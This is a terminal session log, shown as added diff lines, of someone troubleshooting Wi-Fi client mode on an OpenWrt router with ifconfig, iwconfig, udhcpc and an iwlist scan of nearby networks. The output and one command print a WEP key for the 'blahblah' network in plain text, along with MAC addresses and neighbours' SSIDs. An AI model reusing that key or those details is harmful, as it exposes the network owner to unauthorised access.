+          RX bytes:14450141 (13.7 MiB)  TX bytes:42389904 (40.4 MiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:54 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:54 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:4675 (4.5 KiB)  TX bytes:4675 (4.5 KiB)
+
+root@OpenWrt:/etc/config# ping google.com
+PING google.com (173.194.46.2): 56 data bytes
+64 bytes from 173.194.46.2: seq=0 ttl=52 time=14.495 ms
+^C
+--- google.com ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 14.495/14.495/14.495 ms
+root@OpenWrt:/etc/config# opkg install dhclient
+Unknown package 'dhclient'.
+Collected errors:
+ * opkg_install_cmd: Cannot install package dhclient.
+root@OpenWrt:/etc/config# ping 192.168.1.2
+PING 192.168.1.2 (192.168.1.2): 56 data bytes
+^C
+--- 192.168.1.2 ping statistics ---
+3 packets transmitted, 0 packets received, 100% packet loss
+root@OpenWrt:/etc/config# iwconfig wlan0 192.168.1.157/24
+iwconfig: unknown command "192.168.1.157/24"
+root@OpenWrt:/etc/config# ifconfig wlan0 192.168.1.157/24
+root@OpenWrt:/etc/config# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:151719 errors:0 dropped:11599 overruns:0 frame:0
+          TX packets:149687 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:11194820 (10.6 MiB)  TX bytes:42463209 (40.4 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:155357 errors:0 dropped:15 overruns:0 frame:0
+          TX packets:149833 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:14578312 (13.9 MiB)  TX bytes:42469925 (40.5 MiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:61 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:61 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:5439 (5.3 KiB)  TX bytes:5439 (5.3 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.157  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:373 (373.0 B)  TX bytes:0 (0.0 B)
+
+root@OpenWrt:/etc/config# ping 192.168.1.2
+PING 192.168.1.2 (192.168.1.2): 56 data bytes
+^C
+--- 192.168.1.2 ping statistics ---
+7 packets transmitted, 0 packets received, 100% packet loss
+root@OpenWrt:/etc/config# iwconfig
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11bgn  ESSID:"blahblah"  
+          Mode:Managed  Frequency:2.462 GHz  Access Point: 00:24:8C:B3:65:51   
+          Bit Rate=1 Mb/s   Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Encryption key:C630-9099-39ED-8480-BD1D-559F-68
+          Power Management:off
+          Link Quality=70/70  Signal level=-21 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+eth0      no wireless extensions.
+
+br-lan    no wireless extensions.
+
+root@OpenWrt:/etc/config# udhcpc -i wlan0 -b
+udhcpc (v1.19.4) started
+Sending discover...
+Sending discover...
+Sending discover...
+No lease, forking to background
+root@OpenWrt:/etc/config# iwconfig
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11bgn  ESSID:"blahblah"  
+          Mode:Managed  Frequency:2.462 GHz  Access Point: 00:24:8C:B3:65:51   
+          Bit Rate=1 Mb/s   Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Encryption key:C630-9099-39ED-8480-BD1D-559F-68
+          Power Management:off
+          Link Quality=70/70  Signal level=-16 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:9   Missed beacon:0
+
+eth0      no wireless extensions.
+
+br-lan    no wireless extensions.
+
+root@OpenWrt:/etc/config# ifconfig
+br-lan    Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          inet addr:192.168.1.108  Bcast:192.168.1.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:152411 errors:0 dropped:11830 overruns:0 frame:0
+          TX packets:150083 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:11279672 (10.7 MiB)  TX bytes:42526480 (40.5 MiB)
+
+eth0      Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:156074 errors:0 dropped:15 overruns:0 frame:0
+          TX packets:150230 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:14683361 (14.0 MiB)  TX bytes:42533242 (40.5 MiB)
+          Interrupt:4 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:68 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:68 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:6223 (6.0 KiB)  TX bytes:6223 (6.0 KiB)
+
+wlan0     Link encap:Ethernet  HWaddr 0C:82:68:F9:20:7A  
+          UP BROADCAST MULTICAST  MTU:1500  Metric:1
+          RX packets:152 errors:0 dropped:13 overruns:0 frame:0
+          TX packets:12 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:32 
+          RX bytes:13066 (12.7 KiB)  TX bytes:5064 (4.9 KiB)
+
+root@OpenWrt:/etc/config# iwconfig
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11bgn  ESSID:off/any  
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Encryption key:C630-9099-39ED-8480-BD1D-559F-68
+          Power Management:off
+          
+eth0      no wireless extensions.
+
+br-lan    no wireless extensions.
+
+root@OpenWrt:/etc/config# iwlist wlan0 scan
+wlan0     Scan completed :
+          Cell 01 - Address: 68:7F:74:B8:B6:61
+                    Channel:1
+                    Frequency:2.412 GHz (Channel 1)
+                    Quality=52/70  Signal level=-58 dBm  
+                    Encryption key:off
+                    ESSID:"Jose-guest"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=000002367eac47bd
+                    Extra: Last beacon: 90ms ago
+                    IE: Unknown: 000A4A6F73652D6775657374
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 030101
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 2F0104
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: 2D1AFC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: 3D1601081500000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F0101
+                    IE: Unknown: DD090010180209F0040000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+                    IE: Unknown: DD1E00904C33FC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: DD1A00904C3401081500000000000000000000000000000000000000
+          Cell 02 - Address: 68:7F:74:B8:B6:5F
+                    Channel:1
+                    Frequency:2.412 GHz (Channel 1)
+                    Quality=53/70  Signal level=-57 dBm  
+                    Encryption key:on
+                    ESSID:"Jose"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=000002367eac517e
+                    Extra: Last beacon: 90ms ago
+                    IE: Unknown: 00044A6F7365
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 030101
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 2F0104
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers (2) : CCMP TKIP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: 2D1AFC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: 3D1601081500000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F0101
+                    IE: Unknown: DD7A0050F204104A00011010440001021041000100103B00010310470010318F56E90FDE7CE5CCFA9D6F5DEEAF7B10210005436973636F1023000D4C696E6B7379732045333030301024000776312E302E30311042000234321054000800060050F20400011011000D4C696E6B737973204533303030100800020084
+                    IE: Unknown: DD090010180209F0040000
+                    IE: WPA Version 1
+                        Group Cipher : TKIP
+                        Pairwise Ciphers (2) : CCMP TKIP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+                    IE: Unknown: DD1E00904C33FC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: DD1A00904C3401081500000000000000000000000000000000000000
+          Cell 03 - Address: 00:24:8C:B3:65:51
+                    Channel:11
+                    Frequency:2.462 GHz (Channel 11)
+                    Quality=54/70  Signal level=-56 dBm  
+                    Encryption key:on
+                    ESSID:"blahblah"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=00000000020449c1
+                    Extra: Last beacon: 90ms ago
+                    IE: Unknown: 0008626C6168626C6168
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 03010B
+                    IE: Unknown: 2A0100
+                    IE: Unknown: 2F0100
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: DD090010180200F0000000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+          Cell 04 - Address: E0:91:F5:85:4D:06
+                    Channel:8
+                    Frequency:2.447 GHz (Channel 8)
+                    Quality=70/70  Signal level=0 dBm  
+                    Encryption key:on
+                    ESSID:"MatchBox"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
+                              24 Mb/s; 36 Mb/s; 54 Mb/s
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s
+                    Mode:Master
+                    Extra:tsf=0000001019a7ec1d
+                    Extra: Last beacon: 90ms ago
+                    IE: Unknown: 00084D61746368426F78
+                    IE: Unknown: 010882848B962430486C
+                    IE: Unknown: 030108
+                    IE: Unknown: 2A0104
+                    IE: Unknown: 2F0104
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : CCMP
+                        Pairwise Ciphers (1) : CCMP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32040C121860
+                    IE: Unknown: 2D1AFC181BFFFF000000000000000000000000000000000000000000
+                    IE: Unknown: 3D1608080400000000000000000000000000000000000000
+                    IE: Unknown: 4A0E14000A002C01C800140005001900
+                    IE: Unknown: 7F0101
+                    IE: Unknown: DD090010180205F42C0000
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00
+          Cell 05 - Address: 88:51:FB:24:D3:5F
+                    Channel:11
+                    Frequency:2.462 GHz (Channel 11)
+                    Quality=22/70  Signal level=-88 dBm  
+                    Encryption key:on
+                    ESSID:"HP-Print-5F-Officejet Pro 8600"
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
+                              9 Mb/s; 12 Mb/s; 18 Mb/s
+                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
+                    Mode:Master
+                    Extra:tsf=000000137cf06af5
+                    Extra: Last beacon: 90ms ago
+                    IE: Unknown: 001E48502D5072696E742D35462D4F66666963656A65742050726F2038363030
+                    IE: Unknown: 010882848B960C121824
+                    IE: Unknown: 03010B
+                    IE: Unknown: 2A0100
+                    IE: IEEE 802.11i/WPA2 Version 1
+                        Group Cipher : CCMP
+                        Pairwise Ciphers (1) : CCMP
+                        Authentication Suites (1) : PSK
+                    IE: Unknown: 32043048606C
+                    IE: Unknown: DD180050F2020101800027A4000003A4000042435E0062322F00
+
+root@OpenWrt:/etc/config# iwconfig wlan0 essid blahblah key C6:30:90:99:39:ED:84:80:BD:1D:55:9F:68
+root@OpenWrt:/etc/config# udhcpc -i wlan0 -b
+udhcpc (v1.19.4) started
+Sending discover...
+Sending discover...
+Sending discover...
+No lease, forking to background
+root@OpenWrt:/etc/config# iwconfig
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11bgn  ESSID:"blahblah"  
+          Mode:Managed  Frequency:2.462 GHz  Access Point: 00:24:8C:B3:65:51   
+          Bit Rate=1 Mb/s   Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Encryption key:C630-9099-39ED-8480-BD1D-559F-68
+          Power Management:off
+          Link Quality=70/70  Signal level=-28 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:5   Missed beacon:0
+
+eth0      no wireless extensions.
+
+br-lan    no wireless extensions.
+
+root@OpenWrt:/etc/config# ping 192.168.1.2
+PING 192.168.1.2 (192.168.1.2): 56 data bytes
+^C
+--- 192.168.1.2 ping statistics ---
+5 packets transmitted, 0 packets received, 100% packet loss
+root@OpenWrt:/etc/config# ls
+dhcp           firewall       luci           network.toki   system         ucitrack       wireless.orig
+dhcp.orig      firewall.orig  network        ptunnel        system.orig    uhttpd         wireless.toki
+dropbear       fstab          network.orig   sshtunnel      ubootenv       wireless
+root@OpenWrt:/etc/config# cat wireless
+
+config wifi-device 'radio0'
+	option type 'mac80211'
+	option channel '11'
+	option macaddr '0c:82:68:f9:20:7a'
+	option hwmode '11ng'
+	option htmode 'HT20'
+	list ht_capab 'SHORT-GI-20'
+	list ht_capab 'SHORT-GI-40'
+	list ht_capab 'RX-STBC1'
+	list ht_capab 'DSSS_CCK-40'
+	option txpower '27'
+	option country 'US'
+
+config wifi-iface
+	option device 'radio0'
+	option network 'lan'
+	option ssid 'OpenWrt'
+	option encryption 'none'
+	option mode 'sta'
+
+root@OpenWrt:/etc/config# iwconfig
+lo        no wireless extensions.
+
+wlan0     IEEE 802.11bgn  ESSID:"blahblah"  
+          Mode:Managed  Frequency:2.462 GHz  Access Point: 00:24:8C:B3:65:51   
+          Bit Rate=36 Mb/s   Tx-Power=18 dBm   
+          RTS thr:off   Fragment thr:off
+          Encryption key:C630-9099-39ED-8480-BD1D-559F-68
+          Power Management:off
+          Link Quality=70/70  Signal level=-24 dBm  
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:58   Missed beacon:0
+
+eth0      no wireless extensions.
+
+br-lan    no wireless extensions.
+
+root@OpenWrt:/etc/config# udhcpc -i wlan0 -b
+udhcpc (v1.19.4) started
+Sending discover...
+Sending discover...
+Sending discover...
+No lease, forking to background
+root@OpenWrt:/etc/config# udhcpc -i wlan0 -b
+udhcpc (v1.19.4) started
+Sending discover...
+Sending discover...
+Sending discover...
+No lease, forking to background
+root@OpenWrt:/etc/config# Write failed: Broken pipe
